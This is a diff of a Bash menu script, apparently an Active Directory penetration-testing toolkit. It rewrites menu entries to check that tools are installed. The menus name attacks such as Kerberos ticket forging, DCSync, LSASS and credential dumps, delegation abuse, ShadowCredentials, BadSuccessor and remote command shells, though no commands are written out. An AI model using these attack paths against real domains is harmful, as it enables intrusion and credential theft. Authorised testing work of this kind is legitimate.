+    check_tool_status "${impacket_ticketer}" "Generate Silver Ticket (requires: hash of SPN service account or DCSync rights)" "12"
+    check_tool_status "${impacket_getST}" "Request ticket for another user using S4U2self (OPSEC alternative to Silver Ticket) (requires: authenticated session of SPN service account, for example 'svc')" "13"
+    check_tool_status "${impacket_ticketer}" "Generate Diamond Ticket (requires: hash of krbtgt or DCSync rights)" "14"
+    check_tool_status "${impacket_ticketer}" "Generate Sapphire Ticket (requires: hash of krbtgt or DCSync rights)" "15"
+    check_tool_status "${impacket_raiseChild}" "Privilege escalation from Child Domain to Parent Domain using raiseChild (requires: DA rights on child domain)" "16"
+    check_tool_status "${impacket_getST}" "Request impersonated ticket using Constrained Delegation rights (requires: authenticated session of account allowed for delegation, for example 'gmsa')" "17"
+    check_tool_status "${impacket_getST}" "Request impersonated ticket using Resource-Based Constrained Delegation rights (requires: authenticated session of SPN account allowed for RBCD)" "18"
+    check_tool_status "${impacket_getST}" "Request TGS impersonated ticket using dMSA to exploit BadSuccessor (requires: authenticated session of account with BadSuccessor privileges)" "19"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -6149,19 +6169,19 @@ shares_menu() {
     echo -e "${CYAN}[SMB Shares menu]${NC} Please choose from the following options:"
     echo -e "-----------------------------------------------------------"
     echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW} ${curr_targets}${custom_servers}${custom_ip}${NC} - Number of server(s): ${YELLOW}$(wc -l < "${curr_targets_list}")${NC}"
-    echo -e "A) SMB SHARES SCANS #2-3-4"
+    echo -e "A) NETWORK SHARES ENUMERATIONS #2-3-4"
     echo -e "m) Modify target(s)"
-    echo -e "1) SMB shares Scan using smbmap"
-    echo -e "2) SMB shares Enumeration using netexec"
-    echo -e "3) SMB shares Spidering using netexec "
-    echo -e "4) SMB shares Scan using FindUncommonShares"
-    echo -e "5) List all servers and run SMB shares Scan using FindUncommonShares"
-    echo -e "6) SMB shares Scan using manspider"
-    echo -e "7) SMB shares Scan using ShareHound"
-    echo -e "8) SMB shares Scan using ShareHound (on all subnets)"
-    echo -e "9) Open smbclient.py console on target"
-    echo -e "10) Open p0dalirius's smbclientng console on target"
-    echo -e "11) Search for LogonScript misconfigurations using ScriptScout"
+    check_tool_status "${smbmap}" "Shares Enumeration using smbmap" "1"
+    check_tool_status "${netexec}" "Shares Enumeration using netexec" "2"
+    check_tool_status "${netexec}" "Spider_plus using netexec" "3"
+    check_tool_status "${FindUncommonShares}" "FindUncommonShares on targets" "4"
+    check_tool_status "${FindUncommonShares}" "FindUncommonShares on all domain hosts" "5"
+    check_tool_status "${manspider}" "Find Content in Shares using manspider" "6"
+    check_tool_status "${sharehound}" "ShareHound using ShotHound approach" "7"
+    check_tool_status "${sharehound}" "ShareHound using ShotHound approach on all domain subnets" "8"
+    check_tool_status "${impacket_smbclient}" "Open smbclient console on target" "9"
+    check_tool_status "${smbclientng}" "Open smbclientng console on target" "10"
+    check_tool_status "${ScriptScout}" "ScriptScout check" "11"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -6179,7 +6199,7 @@ shares_menu() {
         ;;
 
     1)
-        smb_map
+        smbmap_scan
         shares_menu
         ;;
 
@@ -6258,23 +6278,23 @@ vulns_menu() {
     echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW} ${curr_targets}${custom_servers}${custom_ip}${NC} - Number of server(s): ${YELLOW}$(wc -l < "${curr_targets_list}")${NC}"
     echo -e "A) VULNERABILITY CHECKS #3-4-5-8-13-16"
     echo -e "m) Modify target(s)"
-    echo -e "1) zerologon check using netexec (only on DC)"
-    echo -e "2) MS17-010 check using netexec"
-    echo -e "3) Print Spooler and Printnightmare checks using netexec"
-    echo -e "4) WebDAV check using netexec"
-    echo -e "5) coerce check using netexec"
-    echo -e "6) Run coerce attack using netexec"
-    echo -e "7) SMB signing check using netexec"
-    echo -e "8) ntlmv1, smbghost and remove-mic checks using netexec"
-    echo -e "9) RPC Dump and check for interesting protocols"
-    echo -e "10) Coercer RPC scan"
-    echo -e "11) PushSubscription abuse using PrivExchange"
-    echo -e "12) RunFinger scan"
-    echo -e "13) Run LDAPNightmare check"
-    echo -e "14) Run sessions enumeration using netexec (reg-sessions)"
-    echo -e "15) Check for unusual sessions"
-    echo -e "16) Check for BadSuccessor vuln using netexec and impacket"
-    echo -e "17) RelayKing Coerce scan"
+    check_tool_status "${netexec}" "zerologon check using netexec (only on DC)" "1"
+    check_tool_status "${netexec}" "MS17-010 check using netexec" "2"
+    check_tool_status "${netexec}" "Print Spooler and Printnightmare checks using netexec" "3"
+    check_tool_status "${netexec}" "WebDAV check using netexec" "4"
+    check_tool_status "${netexec}" "coerce check using netexec" "5"
+    check_tool_status "${netexec}" "Run coerce attack using netexec" "6"
+    check_tool_status "${netexec}" "SMB signing check using netexec" "7"
+    check_tool_status "${netexec}" "ntlmv1, smbghost and remove-mic checks using netexec" "8"
+    check_tool_status "${impacket_rpcdump}" "RPC Dump and check for interesting protocols" "9"
+    check_tool_status "${coercer}" "Coercer RPC scan" "10"
+    check_tool_status "${privexchange}" "PushSubscription abuse using PrivExchange" "11"
+    check_tool_status "${RunFinger}" "RunFinger scan" "12"
+    check_tool_status "${LDAPNightmare}" "Run LDAPNightmare check" "13"
+    check_tool_status "${netexec}" "Run sessions enumeration using netexec (reg-sessions)" "14"
+    check_tool_status "${FindUnusualSessions}" "Check for unusual sessions" "15"
+    check_tool_status "${impacket_badsuccessor}" "Check for BadSuccessor vuln using netexec and impacket" "16"
+    check_tool_status "${relayking}" "RelayKing Coerce scan" "17"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -6401,11 +6421,11 @@ mssql_menu() {
         echo -e "${PURPLE}[-] MSSQL Enumeration requires credentials${NC}"
     else
         echo -e "A) MSSQL CHECKS #1-2"
-        echo -e "1) MSSQL Enumeration using netexec"
-        echo -e "2) MSSQL Relay check"
-        echo -e "3) Open mssqlclient.py console on target"
-        echo -e "4) Open mssqlpwner in interactive mode"
-        echo -e "5) Enumeration Domain objects using RID bruteforce"
+        check_tool_status "${netexec}" "MSSQL Enumeration using netexec" "1"
+        check_tool_status "${netexec}" "MSSQL Relay check" "2"
+        check_tool_status "${impacket_mssqlclient}" "Open mssqlclient.py console on target" "3"
+        check_tool_status "${mssqlpwner}" "Open mssqlpwner in interactive mode" "4"
+        check_tool_status "${netexec}" "Enumeration Domain objects using RID bruteforce" "5"
     fi
     echo -e "back) Go back"
     echo -e "exit) Exit"
@@ -6470,27 +6490,27 @@ pwd_menu() {
     else
         echo -e "A) PASSWORD DUMPS #1-2-4-15-17"
         echo -e "m) Modify target(s)"
-        echo -e "1) LAPS Dump using netexec"
-        echo -e "2) gMSA Dump using netexec"
-        echo -e "3) DCSync using secretsdump (only on DC)"
-        echo -e "4) Dump SAM and LSA using secretsdump"
-        echo -e "5) Dump SAM and SYSTEM using reg"
-        echo -e "6) Dump NTDS using netexec"
-        echo -e "7) Dump SAM and LSA secrets using netexec"
-        echo -e "8) Dump SAM and LSA secrets using netexec without touching disk (regdump)"
-        echo -e "9) Dump LSASS using lsassy"
-        echo -e "10) Dump LSASS using handlekatz"
-        echo -e "11) Dump LSASS using procdump"
-        echo -e "12) Dump LSASS using nanodump"
-        echo -e "13) Dump dpapi secrets using netexec"
-        echo -e "14) Dump secrets using DonPAPI"
-        echo -e "15) Dump secrets using DonPAPI (Disable Remote Ops operations)"
-        echo -e "16) Dump secrets using hekatomb (only on DC)"
-        echo -e "17) Search for juicy information using netexec"
-        echo -e "18) Dump Veeam credentials (only from Veeam server)"
-        echo -e "19) Dump Msol password (only from Azure AD-Connect server)"
-        echo -e "20) Extract Bitlocker Keys"
-        echo -e "21) Dump SAM and LSA secrets using winrm with netexec"
+        check_tool_status "${netexec}" "LAPS Dump using netexec" "1"
+        check_tool_status "${netexec}" "gMSA Dump using netexec" "2"
+        check_tool_status "${impacket_secretsdump}" "DCSync using secretsdump (only on DC)" "3"
+        check_tool_status "${impacket_secretsdump}" "Dump SAM and LSA using secretsdump" "4"
+        check_tool_status "${impacket_reg}" "Dump SAM and SYSTEM using reg" "5"
+        check_tool_status "${netexec}" "Dump NTDS using netexec" "6"
+        check_tool_status "${netexec}" "Dump SAM and LSA secrets using netexec" "7"
+        check_tool_status "${netexec}" "Dump SAM and LSA secrets using netexec without touching disk (regdump)" "8"
+        check_tool_status "${netexec}" "Dump LSASS using lsassy" "9"
+        check_tool_status "${netexec}" "Dump LSASS using handlekatz" "10"
+        check_tool_status "${netexec}" "Dump LSASS using procdump" "11"
+        check_tool_status "${netexec}" "Dump LSASS using nanodump" "12"
+        check_tool_status "${netexec}" "Dump dpapi secrets using netexec" "13"
+        check_tool_status "${donpapi}" "Dump secrets using DonPAPI" "14"
+        check_tool_status "${donpapi}" "Dump secrets using DonPAPI (Disable Remote Ops operations)" "15"
+        check_tool_status "${hekatomb}" "Dump secrets using hekatomb (only on DC)" "16"
+        check_tool_status "${netexec}" "Search for juicy information using netexec" "17"
+        check_tool_status "${netexec}" "Dump Veeam credentials (only from Veeam server)" "18"
+        check_tool_status "${netexec}" "Dump Msol password (only from Azure AD-Connect server)" "19"
+        check_tool_status "${ExtractBitlockerKeys}" "Extract Bitlocker Keys" "20"
+        check_tool_status "${netexec}" "Dump SAM and LSA secrets using winrm with netexec" "21"
     fi
     echo -e "back) Go back"
     echo -e "exit) Exit"
@@ -6636,32 +6656,32 @@ modif_menu() {
     echo -e "-------------------------------------------------------------"
     echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW} ${curr_targets}${custom_servers}${custom_ip}${NC} - Number of server(s): ${YELLOW}$(wc -l < "${curr_targets_list}")${NC}"
     echo -e "m) Modify target(s)"
-    echo -e "1) Change user or computer password (Requires: ${PURPLE}ForceChangePassword${NC})"
-    echo -e "2) Add user to group (Requires: ${PURPLE}AddMember${NC} on group)"
-    echo -e "3) Remove user from group (Requires: ${PURPLE}AddMember${NC} on group)"
-    echo -e "4) Add new computer (Requires: MAQ > 0)"
-    echo -e "4ou) Add new computer to a custom OU location (Requires: MAQ > 0 and ${PURPLE}GenericWrite${NC} on OU)"
-    echo -e "5) Add new DNS entry (Requires: Modification of DNS)"
-    echo -e "6) Enable account (Requires: ${PURPLE}GenericWrite${NC})"
-    echo -e "7) Disable account (Requires: ${PURPLE}GenericWrite${NC})"
-    echo -e "8) Change Owner of target (Requires: ${PURPLE}WriteOwner${NC} permission)"
-    echo -e "9) Add GenericAll rights on target (Requires: ${PURPLE}Owner${NC} of object)"
-    echo -e "10) Delete user or computer (Requires: ${PURPLE}GenericWrite${NC})"
-    echo -e "11) Restore deleted user or computer (Requires: ${PURPLE}GenericWrite${NC} on OU of deleted object)"
-    echo -e "12) Targeted Kerberoast Attack (Noisy!) (Requires: ${PURPLE}WriteSPN${NC})"
-    echo -e "13) Perform RBCD attack (Requires: ${PURPLE}AllowedToAct${NC} on computer)"
-    echo -e "14) Perform RBCD attack on SPN-less user (Requires: ${PURPLE}AllowedToAct${NC} on computer & MAQ=0)"
-    echo -e "15) Perform ShadowCredentials attack (Requires: ${PURPLE}AddKeyCredentialLink${NC})"
-    echo -e "16) Remove added ShadowCredentials (Requires: ${PURPLE}AddKeyCredentialLink${NC})"
-    echo -e "17) Abuse GPO to execute command (Requires: ${PURPLE}GenericWrite${NC} on GPO)"
-    echo -e "18) Add Unconstrained Delegation rights - uac: TRUSTED_FOR_DELEGATION (Requires: ${PURPLE}SeEnableDelegationPrivilege${NC} rights)"
-    echo -e "19) Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: ${PURPLE}Owner${NC} of computer)"
-    echo -e "20) Add userPrincipalName to perform Kerberos impersonation of another user (Targeting Linux machines) (Requires: ${PURPLE}GenericWrite${NC} on user)"
-    echo -e "21) Modify userPrincipalName to perform Certificate impersonation (ESC10) (Requires: ${PURPLE}GenericWrite${NC} on user)"
-    echo -e "22) Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: ${PURPLE}SeEnableDelegationPrivilege${NC} rights)"
-    echo -e "23) Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: ${PURPLE}Owner${NC} of computer)"
-    echo -e "24) Add dMSA to exploit BadSuccessor on Windows Server 2025 (Requires: ${PURPLE}GenericWrite${NC} on OU)"
-    echo -e "25) Remove dMSA to clean after exploiting BadSuccessor (Requires: ${PURPLE}GenericWrite${NC} on OU)"
+    check_tool_status "${bloodyad}" "Change user or computer password (Requires: ForceChangePassword)" "1"
+    check_tool_status "${bloodyad}" "Add user to group (Requires: AddMember on group)" "2"
+    check_tool_status "${bloodyad}" "Remove user from group (Requires: AddMember on group)" "3"
+    check_tool_status "${bloodyad}" "Add new computer (Requires: MAQ > 0)" "4"
+    check_tool_status "${bloodyad}" "Add new computer to a custom OU location (Requires: MAQ > 0 and GenericWrite on OU)" "4ou"
+    check_tool_status "${bloodyad}" "Add new DNS entry (Requires: Modification of DNS)" "5"
+    check_tool_status "${bloodyad}" "Enable account (Requires: GenericWrite)" "6"
+    check_tool_status "${bloodyad}" "Disable account (Requires: GenericWrite)" "7"
+    check_tool_status "${bloodyad}" "Change Owner of target (Requires: WriteOwner permission)" "8"
+    check_tool_status "${bloodyad}" "Add GenericAll rights on target (Requires: Owner of object)" "9"
+    check_tool_status "${bloodyad}" "Delete user or computer (Requires: GenericWrite)" "10"
+    check_tool_status "${bloodyad}" "Restore deleted user or computer (Requires: GenericWrite on OU of deleted object)" "11"
+    check_tool_status "${targetedKerberoast}" "Targeted Kerberoast Attack (Noisy!) (Requires: WriteSPN)" "12"
+    check_tool_status "${bloodyad}" "Perform RBCD attack (Requires: AllowedToAct on computer)" "13"
+    check_tool_status "${bloodyad}" "Perform RBCD attack on SPN-less user (Requires: AllowedToAct on computer & MAQ=0)" "14"
+    check_tool_status "${bloodyad}" "Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)" "15"
+    check_tool_status "${bloodyad}" "Remove added ShadowCredentials (Requires: AddKeyCredentialLink)" "16"
+    check_tool_status "${pygpoabuse}" "Abuse GPO to execute command (Requires: GenericWrite on GPO)" "17"
+    check_tool_status "${bloodyad}" "Add Unconstrained Delegation rights - uac: TRUSTED_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "18"
+    check_tool_status "${bloodyad}" "Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: Owner of computer)" "19"
+    check_tool_status "${bloodyad}" "Add userPrincipalName to perform Kerberos impersonation of another user (Targeting Linux machines) (Requires: GenericWrite on user)" "20"
+    check_tool_status "${bloodyad}" "Modify userPrincipalName to perform Certificate impersonation (ESC10) (Requires: GenericWrite on user)" "21"
+    check_tool_status "${bloodyad}" "Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "22"
+    check_tool_status "${bloodyad}" "Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: Owner of computer)" "23"
+    check_tool_status "${bloodyad}" "Add dMSA to exploit BadSuccessor on Windows Server 2025 (Requires: GenericWrite on OU)" "24"
+    check_tool_status "${bloodyad}" "Remove dMSA to clean after exploiting BadSuccessor (Requires: GenericWrite on OU)" "25"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -6819,10 +6839,10 @@ cmdexec_menu() {
     echo -e ""
     echo -e "${CYAN}[Command Execution menu]${NC} Please choose from the following options:"
     echo -e "------------------------------------------------------------------"
-    echo -e "1) Open CMD console using smbexec on target"
-    echo -e "2) Open CMD console using wmiexec on target"
-    echo -e "3) Open CMD console using psexec on target"
-    echo -e "4) Open PowerShell console using evil-winrm on target"
+    check_tool_status "${impacket_smbexec}" "Open CMD console using smbexec on target" "1"
+    check_tool_status "${impacket_wmiexec}" "Open CMD console using wmiexec on target" "2"
+    check_tool_status "${impacket_psexec}" "Open CMD console using psexec on target" "3"
+    check_tool_status "${evilwinrm}" "Open PowerShell console using evil-winrm on target" "4"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -6873,15 +6893,15 @@ netscan_menu() {
     echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW} ${curr_targets}${custom_servers}${custom_ip}${NC} - Number of server(s): ${YELLOW}$(wc -l < "${curr_targets_list}")${NC}"
     echo -e "A) NETWORK SCANS #1-3-4-7-8"
     echo -e "m) Modify target(s)"
-    echo -e "1) Identify hosts with accessible SMB port using netexec"
-    echo -e "2) Identify hosts with accessible RDP port using netexec"
-    echo -e "3) Identify hosts with accessible WinRM port using netexec"
-    echo -e "4) Identify hosts with accessible SSH port using netexec"
-    echo -e "5) Identify hosts with accessible FTP port using netexec"
-    echo -e "6) Identify hosts with accessible VNC port using netexec"
-    echo -e "7) Identify hosts with accessible MSSQL port using netexec"
-    echo -e "8) Basic scan of domain machines using NetworkHound"
-    echo -e "9) Full scan of domain and Shadow IT machines using NetworkHound"
+    check_tool_status "${netexec}" "Identify hosts with accessible SMB port using netexec" "1"
+    check_tool_status "${netexec}" "Identify hosts with accessible RDP port using netexec" "2"
+    check_tool_status "${netexec}" "Identify hosts with accessible WinRM port using netexec" "3"
+    check_tool_status "${netexec}" "Identify hosts with accessible SSH port using netexec" "4"
+    check_tool_status "${netexec}" "Identify hosts with accessible FTP port using netexec" "5"
+    check_tool_status "${netexec}" "Identify hosts with accessible VNC port using netexec" "6"
+    check_tool_status "${netexec}" "Identify hosts with accessible MSSQL port using netexec" "7"
+    check_tool_status "${NetworkHound}" "Basic scan of domain machines using NetworkHound" "8"
+    check_tool_status "${NetworkHound}" "Full scan of domain and Shadow IT machines using NetworkHound" "9"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
